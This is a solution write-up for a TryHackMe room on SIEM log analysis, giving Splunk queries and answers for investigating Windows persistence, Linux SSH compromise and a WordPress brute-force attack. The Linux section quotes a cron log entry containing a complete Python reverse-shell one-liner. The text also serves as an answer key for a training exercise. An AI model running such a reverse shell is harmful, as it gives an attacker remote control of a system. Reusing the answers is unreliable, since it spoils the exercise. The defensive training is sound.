# [TryHackMe | Log Analysis with SIEM](https://tryhackme.com/room/loganalysiswithsiem) Challenge Room Solution Writeup

## [Task 2 | Benefits of SIEM for Analysts](https://tryhackme.com/room/loganalysiswithsiem?taskNo=2)

### What is the process of linking data from multiple sources to identify relationships between individual events called?

**Correlation**

### What is the process of collecting and storing log data from multiple systems and sources into a single, unified location for easier analysis called?

**Centralisation**

## [Task 3 | Log Sources Overview](https://tryhackme.com/room/loganalysiswithsiem?taskNo=3)

### What is the process of converting logs from different formats into a single format for easier analysis in a SIEM?

**Normalisation**

### Which log source type can be used to detect the execution of a malicious script?

**Host-Based**

https[:]//LAB_WEB_URL[.]p[.]thmlabs[.]com will be used for the remaining tasks.

## [Task 4 | Windows Logs](https://tryhackme.com/room/loganalysiswithsiem?taskNo=4)

You are an SOC Level 1 Analyst on shift and have received an alert indicating a suspicious network connection using port 5678 on the WIN-105 host. Your task is to conduct an investigation and determine whether this activity is suspicious.

### Which IP address was the connection established with?

Run the query `index=task4 ComputerName=WIN-105 DestinationPort=5678` to find `DestinationIp: `**10.10.114.80**.

### Which process initiated this suspicious connection?

The previous query also returns `Image: C:\Windows\Temp\`**SharePoInt.exe**.

### What is the MD5 hash of the malicious process from the previous question?

Run the query `index=task4 ComputerName=WIN-105 EventCode=1 Image=*SharePoInt.exe*` to find `Hashes: MD5=`**770D14FFA142F09730B415506249E7D1**.

### What is the name of the scheduled task that was created on the system?

Run the query `index=task4 ComputerName=WIN-105 Image=*schtasks.exe* CommandLine=*SharePoInt.exe*` to find `CommandLine: schtasks  /create /sc once /st 15:30 /tn "`**Office365 Install**`" /tr "C:\Windows\Temp\SharePoInt.exe"`.

## [Task 5 | Linux Logs](https://tryhackme.com/room/loganalysiswithsiem?taskNo=5)

You are an SOC Level 1 Analyst on shift and have received an alert indicating possible persistence through the creation of a new remote-ssh user on an Ubuntu server. Your task is to dive into the logs and determine exactly what happened on the system.

### What was the timestamp of the remote-ssh account creation? Answer Format Example: 2025-01-15 12:30:45

Run the following query to find:

```bash
index=task5 COMMAND=/usr/sbin/useradd

2025-08-12T09:52:57.170059+00:00 deceptipot-demo sudo:     root : TTY=pts/1 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/sbin/useradd remote-ssh
```

From which the timestamp is **2025-08-12 09:52:57**.

### Which user successfully escalated their privileges to root prior to the action from the first question?

Run the following query to find:

```bash
index=task5 COMMAND=/usr/bin/su`

2025-08-12T09:52:48.713131+00:00 deceptipot-demo sudo: jack-brown : TTY=pts/0 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/bin/su
```

From which the user is **jack-brown**.

### From which IP address did the user from the previous question successfully log in to the system?

Run the following query to find:

```bash
index=task5 user=jack-brown signature="Accepted password"

2025-08-12T09:51:29.693579+00:00 deceptipot-demo sshd[2595]: Accepted password for jack-brown from 10.14.94.82 port 54451 ssh2
```

From which the IP is **10.14.94.82**.

### How many failed login attempts occurred prior to this successful login?

Run the following query to find:

```bash
index=task5 user=jack-brown (signature="Accepted password" OR signature="Failed password")

2025-08-12T09:51:29.693579+00:00 deceptipot-demo sshd[2595]: Accepted password for jack-brown from 10.14.94.82 port 54451 ssh2

2025-08-12T09:51:00.011009+00:00 deceptipot-demo sshd[2579]: Failed password for jack-brown from 10.14.94.82 port 54446 ssh2

2025-08-12T09:50:59.510491+00:00 deceptipot-demo sshd[2579]: Failed password for jack-brown from 10.14.94.82 port 54446 ssh2

2025-08-12T09:50:48.028888+00:00 deceptipot-demo sshd[2579]: Failed password for jack-brown from 10.14.94.82 port 54446 ssh2

2025-08-12T09:50:36.499410+00:00 deceptipot-demo sshd[2563]: message repeated 2 times: [ Failed password for jack-brown from 10.14.94.82 port 54445 ssh2]

2025-08-12T09:50:27.269171+00:00 deceptipot-demo sshd[2563]: Failed password for jack-brown from 10.14.94.82 port 54445 ssh2
```

From which the number of failed attempts is **4** (one is a duplicate log).

### Which port is the persistence mechanism configured to connect to?

Run the following query to find:

```bash
index=task5 process=CRON

2025-08-12T10:00:01.270628+00:00 deceptipot-demo CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
```

From which the port is **7654**.

## [Task 6 | Web Application Logs](https://tryhackme.com/room/loganalysiswithsiem?taskNo=6)

### Which URI path had the highest number of requests?

Run the following query to find:

```bash
index=task6 
| stats count by uri 
| sort -count

uri             count
/wp-login.php	905
...
```

From which the URI path is **/wp-login.php**.

### Which IP address was the source of the activity?

Run the following query to find:

```bash
index=task6 uri="/wp-login.php"
| stats count by clientip
| sort -count

clientip        count
10.10.243.134	584
167.172.41.141	319
10.14.94.82	    1
205.210.31.27	1
```

From which the IP is **10.10.243.134**.

### How can this activity be classified?

Run the following query to find:

```bash
index=task6 uri="/wp-login.php" clientip=10.10.243.134 
| timechart span=5s count

_time	   count
2025-08-11 10:17:00	61
2025-08-11 10:17:05	85
2025-08-11 10:17:10	85
2025-08-11 10:17:15	85
2025-08-11 10:17:20	90
2025-08-11 10:17:25	90
2025-08-11 10:17:30	80
2025-08-11 10:17:35	8
```

From which the activity shows many repeated (failed) attempts in quick succession, indicative of a **Brute Force** attack.

### Which tool did the threat actor use?

Run the following query to find:

```bash
index=task6 uri="/wp-login.php" clientip=10.10.243.134 
| stats count by useragent

useragent	                                                    count
WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)	584
```

From which the tool is **WPScan**.